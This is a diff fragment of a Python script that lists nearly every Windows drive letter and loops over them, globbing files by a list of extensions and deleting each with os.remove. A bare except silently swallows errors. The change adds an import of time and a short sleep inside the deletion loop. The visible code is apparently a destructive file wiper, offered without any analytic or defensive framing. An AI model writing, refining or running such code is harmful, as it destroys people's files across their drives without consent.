@@ -1,6 +1,6 @@
 import os
 import glob
-
+import time 
 disk = ['A:/', 'E:/', 'I:/', 'O:/', 'U:/', 'Y:/', 
 		'B:/', 'D:/', 'F:/', 'G:/', 'H:/', 'J:/', 
 		'K:/', 'L:/', 'M:/', 'N:/', 'P:/', 'Q:/', 
@@ -27,5 +27,8 @@ for i in s:
 		for j in ras:
 			for file in glob.glob("*"+j):
 				os.remove(file)
+
+		time.sleep(0.01)
 	except:
 		pass
+
